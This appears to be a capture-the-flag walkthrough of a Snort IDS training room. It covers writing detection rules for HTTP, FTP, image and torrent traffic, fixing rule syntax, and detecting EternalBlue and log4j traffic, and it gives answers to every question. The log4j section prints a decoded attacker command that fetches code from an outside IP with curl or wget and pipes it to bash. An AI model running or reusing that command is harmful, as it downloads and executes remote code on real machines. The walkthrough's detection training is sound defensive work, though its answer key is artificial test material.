# Snort Challenge - The Basics

## [Task 1] Introduction

This room builds upon the information provided in the introductory Snort room. Exercise files can be located on the desktop in the attached VM.

## [Task 2] Writing IDS Rules: HTTP

Our first set of rules will be for HTTP traffic, port 80. If we're looking for this kind of traffic, our best bet would be to write an alert like this: `alert tcp any 80 <> any any (msg, sid, rev go here...)`. This rule will alert on TCP port 80 traffic (HTTP), including any traffic going out from that port to a remote address and any traffic headed to the source IP over port 80. We see the number of detected packets as follows:

![image](https://github.com/user-attachments/assets/c99e26e1-1d97-4150-8caa-6ae95569e34d)

**[Task 2, Question 1] What is the number of detected packets?** - 164

Now we can investigate the snort logs. We will read the logs by simply running `sudo snort -r (LOG FILE)`. The name of the log file will differ throughout the entire room, so I'll simply point out what options we'll want to use. In this case, we'll want to run it with `-n 63`. We see that the destination is `216.239.59.99` -- it lies to the right of the arrow.

![image](https://github.com/user-attachments/assets/bd810f89-49a4-4125-a06d-a2f8d2f1e7a3)

**[Task 2, Question 2] What is the destination address of packet 63?** - `216.239.59.99`

Here, we'll run the command with `-n 64` and look at the last packet details. The field of interest here is `Ack:`.

![image](https://github.com/user-attachments/assets/fbd40b57-bdfb-4550-a82f-9f86c3f13c62)

**[Task 2, Question 3] What is the ACK number of packet 64?** - 0x2E6B5384

And we run with `-n 62` for the next question, and we can find the sequence number; it is denoted as `Seq:`.

![image](https://github.com/user-attachments/assets/eb91a87f-ac97-4e70-84ea-079a9a0f9815)

**[Task 2, Question 4] What is the SEQ number of packet 62?** - 0x36C21E28

For the remaining questions of this section, we'll want to run with `-n 65` and review the last packet displayed. To find the TTL, we simply look for the field `TTL:`.

![image](https://github.com/user-attachments/assets/14f53184-d98c-4070-9977-9c9758f62f81)


**[Task 2, Question 5] What is the TTL of packet 65?** - 128

The source IP can be found in the above screenshot. Simply look to the left of the arrow `->`.

**[Task 2, Question 6] What is the source IP of packet 65?** - `145.254.160.237`

The source port for the packet can be found if you look at the source IP address. The `:3372` indicates that the packet came from port 3372.

**[Task 2, Question 7] What is the source port of packet 65?** - 3372

## [Task 3] Writing IDS Rules: FTP

Now we'll create some rules to investigate FTP traffic, which is conducted over TCP port 21. To find all FTP traffic, we'll want to construct the rule `alert tcp any 21 <> any any (OPTIONS...)`. Running this rule against `ftp-png-gif.pcap` shows us that there are 307 packets:

![image](https://github.com/user-attachments/assets/aa11f4a4-3036-46e3-ae67-3ae71427a211)

**[Task 3, Question 1] What is the number of detected packets?** - 307

We'll now need to investigate the generated log file. There's a LOT of stuff to dig through. First of all, we'll need to use `-X` mode to figure out what's actually inside the packets. You'd expect information about the FTP service to be found when communications begin, so it helps to look at the first few packets. Reading the log with `-n 10 -X` and investigating gives us this interesting result in the payload of one of the packets:

![image](https://github.com/user-attachments/assets/5a4578b3-a7ed-4d3c-a062-d8b9e988ee58)

**[Task 3, Question 2] What is the FTP service name?** - Microsoft FTP Service

Now we remove the alert and log files that we just generated, and now we'll construct a new rule to look for failed FTP login attempts. Failed FTP login attempts are denoted with `530 User`. A rule that will pick up on these packets is `alert tcp any 21 <> any any (OPTIONS...; content: "530 User"; OPTIONS...;)`. Running the rule against the pcap file gives us:

![image](https://github.com/user-attachments/assets/c5f3050f-a186-4ac5-95ab-761a1bde9a8f)

**[Task 3, Question 3] What is the number of detected packets?** - 41

Again we delete the alert and log files, and we construct a new rule to find the number of successful FTP logins. The rule in question is `alert tcp any 21 <> any any (OPTIONS...; content: "230 User"; OPTIONS...;)`. This rule takes advantage of the fact that FTP outputs "230 User" when a user successfully logs in. Running the rule against the pcap file yields:

![image](https://github.com/user-attachments/assets/a4efeea6-db84-4f37-b6e4-efd0c47a05cf)

**[Task 3, Question 4] What is the number of detected packets?** - 1

When you attempt to log in with a valid username but no password, FTP will output "331 Password". The rule for this case is `alert tcp any 21 <> any any (OPTIONS...; content: "331 Password"; OPTIONS...;)`. Running this rule against the pcap file yields:

![image](https://github.com/user-attachments/assets/54b9ffeb-e61a-4b39-b1e5-2fbbf9c89044)

**[Task 3, Question 5] What is the number of detected packets?** - 42

This question is pretty neat because it teaches us that we can use `content` multiple times. We'll need to build upon the previous rule to find Administrator logins with no password. The rule would be `alert tcp any 21 <> any any (OPTIONS...; content: "331 Password"; content: "Administrator"; OPTIONS...;)`. Running this rule against the pcap file yields:

![image](https://github.com/user-attachments/assets/df885639-1c9d-4242-b332-d57b10cb64a3)

**[Task 3, Question 6] WHat is the number of detected packets?** - 7

## [Task 4] Writing IDS Rules: PNG

These exercises teach us that we can use hex in our content options. If we're trying to find the presence of PNG files in traffic, we'll want to make use of the PNG _magic number_ - a hex string that identifies a PNG file. The magic number for PNG files is `89 50 4E 47 0D 0A 1A 0A`. We can reasonably expect that a PNG was transported over some TCP application, such as HTTP, so our rule will be `alert tcp any any <> any any (OPTIONS...; content:"|89 50 4E 47 0D 0A 1A 0A|"; OPTIONS...;)`. If we apply this rule to the pcap file, and then read the resulting log file with `-X`, we see the software information near the top of the payload:

![image](https://github.com/user-attachments/assets/16d33c52-ba51-4603-8c40-c6eef9cc5cfe)

**[Task 4, Question 1] Investigate the logs and identify the software name embedded in the packet.** - Adobe ImageReady

A similar strategy will help us find GIF files. The magic number for a GIF is `47 49 46 38`. There are two types of GIF files, and we need to identify which is which. Our rule will be `alert tcp any any <> any any (OPTIONS...; content:"|47 49 46 38|"; OPTIONS...;)`. Applying this rule to the pcap file and reading the resulting log file with `-X` tells us what kind of GIF file we're working with:

![image](https://github.com/user-attachments/assets/bd035d6b-9a2c-4d16-a946-81f70d57b4c0)

**[Task 4, Question 2] Investigate the logs and identify the image format embedded in the packet.** - GIF89a

## [Task 5] Writing IDS Rules: Torrent Metafile

Now we'll make use of Snort to find usage of other applications that we can't necessarily apply a port number to. We know that Torrent files end in `.torrent`, and they are often accessed via TCP ports, so our best bet would be to write a rule like `alert tcp any any <> any any (OPTIONS...; content:".torrent"; OPTIONS...;)`. Applying the rule to the pcap gives us the following:

![image](https://github.com/user-attachments/assets/59f794bd-06f3-4d6a-92b9-09d9e9a2b81f)

**[Task 5, Question 1] What is the number of detected packets?** - 2

For the remaining questions, we'll read the generated log with `-X`. All of the information we're looking for will be here. The next two questions can be answered if you look for `Accept:` in the payload.

![image](https://github.com/user-attachments/assets/7bfc4254-8216-43c1-a70f-474043d03f42)

**[Task 5, Question 2] What is the name of the torrent application?** - bittorrent

**[Task 5, Question 3] What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?** - application/x-bittorrent

...and the hostname can be found if you look for `Host:` in the payload.

**[Task 5, Question 4] What is the hostname of the torrent metafile?** - `tracker2.torrentbox.com`

## [Task 6] Troubleshooting Rule Syntax Errors

We'll take a little break from creating rules. Now we'll work on fixing rules. For each question, we'll investigate a different local-rules file. For this first one, the rule is `alert tcp any 3372 -> any any(msg: "Troubleshooting 1"; sid:1000001; rev:1;)`. Generally in Snort rule-writing, the spaces will actually matter; thus it is not correct to write `any any(msg: "Troubleshooting...` -- we would want to write `any any (msg: "Troubleshooting...`. Putting the space and testing the rule with `sudo snort -c local-1.rules -r mx-1.pcap -A console` gives us the following result. We'll be issuing a similar command for each question in this task.

![image](https://github.com/user-attachments/assets/52e9d81c-68c5-4a7b-99f8-b9837da8a107)

**[Task 6, Question 1] What is the number of the detected packets?** - 16

The rule to fix is `alert icmp any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)`. The issue here is that following the `PROTOCOL` field in the rule, you must supply a source IP of some sort, even if it's just `any`. So the correct rule would be `alert icmp any any -> any any`... After correcting the rule and testing it, we'd get:

![image](https://github.com/user-attachments/assets/c7e3be16-0ed5-44c5-b1ea-153d5eb4d726)

**[Task 6, Question 2] What is the number of the detected packets?** - 68

There are two rules to fix here. Whenever you write multiple rules, you need to use unique `sid`s. So, here, we need to change one of the SIDs to anything else, and then test the rule. We get this as a result:

![image](https://github.com/user-attachments/assets/c97a827d-c423-4fe1-bbe0-b75adb1da2b1)

**[Task 6, Question 3] What is the number of the detected packets?** - 87

The problem rule is `alert tcp any 80,443 -> any any (msg: "HTTPX Packet Found": sid:1000001; rev:1;)`. As before, we need to change the SID so it is unique, but more pressingly, we need to change the colon `:` after `"HTTPX Packet Found"` to a semicolon - that's just the correct syntax. Once we test the rule, we get:

![image](https://github.com/user-attachments/assets/8f899fb3-5648-451b-b713-76d6b7fea255)

**[Task 6, Question 4] What is the number of the detected packets?** - 90

The last two rules are the problem rules here. The second rule uses an invalid operator for the direction; `<-` is not a direction used by Snort. In our case, it would be OK to switch it to `->`, though you would probably need to reverse the source and destination IPs/ports if you needed to get certain inbound traffic. Additionally, the second rule uses `sid;` instead of `sid:`, which would be the appropriate syntax in this case. The last rule has the same issue as before. That colon needs to change to a semicolon. Once we've tested the rule, we get:

![image](https://github.com/user-attachments/assets/e26b0d17-5816-46b7-9eb0-863afa670c9a)

**[Task 6, Question 5] What is the number of the detected packets?** - 155

This rule (and the next) has a logical error - this rule will work perfectly fine without breaking Snort, but it won't get you the results you need. Here, we're looking for GET requests, and the content field has `|67 65 74|`. When translated to ASCII, this yields `get`. The `content` field is case-sensitive, and HTTP requests are always in uppercase. There are multiple solutions to this, including using the `nocase` option, writing the hex for `GET` (`47 45 54`), or simply writing `GET` as the content field.

After making the change and testing, we get:

![image](https://github.com/user-attachments/assets/aaa15736-b5f0-48b6-82ae-27d8dcd6de65)

**[Task 6, Question 6] What is the number of the detected packets?** - 2

This isn't so much a logical error as it is an inconvenience. The rule in this case has no message, so we have NO idea what's being alerted on here. Converting the hex in the `content` field to ASCII, we see that it's looking for `.html`. Thus, we're looking for HTML files - we'll simply add a message to indicate this and then test the rule. To fix this, we need to add the `msg` option.

**[Task 6, Question 7] What is the name of the required option?** - msg

## [Task 7] Using External Rules: MS17-010

OK! And now we'll take a look at how Snort can be used to detect specific threats. In this task, we'll be covering Snort's usage for finding instances of MS17-010, aka EternalBlue. First, we use the `local.rules` file to investigate the pcap. This yields:

![image](https://github.com/user-attachments/assets/62bec368-2411-444b-9473-3c422d6e034d)

**[Task 7, Question 1] What is the number of detected packets?** - 25154

Now we'll clear the log and alert files and create a new rule to find payloads with the `\IPC$` keyword. The trick is that `\` is an escape character in Snort, so if we're going to look for it in ASCII form, we'd have to write the rule as `alert tcp any any <> any any (OPTIONS...; content:"\\IPC$"; OPTIONS...;)`. Running this rule against the pcap yields:

![image](https://github.com/user-attachments/assets/ea0db7fa-092b-4076-8c1c-e555233869b6)

**[Task 7, Question 2] What is the number of detected packets?** - 12

We'll need to read the generated log file for this one, particularly with `-X` so we can get the full payload. The requested path can be found in one of the payloads.

![image](https://github.com/user-attachments/assets/b960ef87-ea28-4ba9-b69f-ff6e0be87872)

**[Task 7, Question 3] What is the requested path?** - `\\192.168.116.138\IPC$`

This last question requires a little bit of research, but if you look up the CVE information for MS17-010 (CVE-2017-0144), you'll see that for CVSS Version 2.0, it is scored at 9.3. That's a pretty critical vulnerability.

![image](https://github.com/user-attachments/assets/1bb55531-f893-484d-b8c2-87dacd3d25d0)

**[Task 7, Question 4] What is the CVSS v2 score of the MS17-010 vulnerability?** - 9.3

## [Task 8] Using External Rules: log4j

And now we conclude by looking at another significant vulnerability. Running the `local.rules` file against the pcap yields the following number of detected packets:

![image](https://github.com/user-attachments/assets/1c1cc714-2e30-4bf5-aa1c-8d172e9ba896)

**[Task 8, Question 1] What is the number of detected packets?** - 26

The output summary from Snort tells us how many events (rules) were triggered:

![image](https://github.com/user-attachments/assets/13ac1b98-2338-463b-a1c5-e6ec4b766029)

**[Task 8, Question 2] How many rules were triggered?** - 4

And we can also find the rule SIDs (sig-id's) from the output summary. Notice how each rule starts with the same six digits.

![image](https://github.com/user-attachments/assets/f3e0846f-fb69-40e9-a208-050e0621281a)

**[Task 8, Question 3] What are the first six digits of the triggered rule SIDs?** - 210037

Now that we've done some basic investigation, let's create a rule to find packet payloads between 770 and 855 bytes. Since we don't have any other information, our best bet will be to use a rule like `alert tcp any any <> any any (OPTIONS...; dsize:770<>855; OPTIONS...;)`. After applying this rule to the pcap file, we get:

![image](https://github.com/user-attachments/assets/7474e983-dc35-4cad-92a2-e95575cb15f5)

**[Task 8, Question 4] What is the number of detected packets?** - 41

Now we'll read the generated log file by using `-X` to see the payload data. The relevant packet will be located towards the end of the set of packets alerted on, and it contains a pretty telling string about the encoding -- it comes right after `Command`:

![image](https://github.com/user-attachments/assets/d85b51a4-6deb-42e5-af7a-5881d5485d19)

**[Task 8, Question 5] What is the name of the used encoding algorithm?** - Base64

The IP ID can be found at the top of the packet, noted in the `ID:` field.

![image](https://github.com/user-attachments/assets/7ba2a2db-28c1-45ee-818b-9c830b3b6b08)

**[Task 8, Question 6] What is the IP ID of the corresponding packet?** - 62808

To figure out what the command was, we can take the base64 code and run it through a decoder like CyberChef or a standard base64 decoder website. You'll have to finangle with the text a bit but once you get it to work, you'll see the command as follows:

![image](https://github.com/user-attachments/assets/c7db453e-4593-4b4a-88f7-f8c5bbd33258)

**[Task 8, Question 7] What is the attacker's command?** - `(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash`

Lastly, we do a little bit of research on the log4j vulnerability. The CVE for this vulnerability is `CVE-2021-44228`, and it has a score of 9.3 under CVSS Version 2.0.

![image](https://github.com/user-attachments/assets/f6fa605e-bf9e-4287-8a1c-03e39126b561)

**[Task 8, Question 8] What is the CVSS v2 score of the Log4j vulnerability?** - 9.3
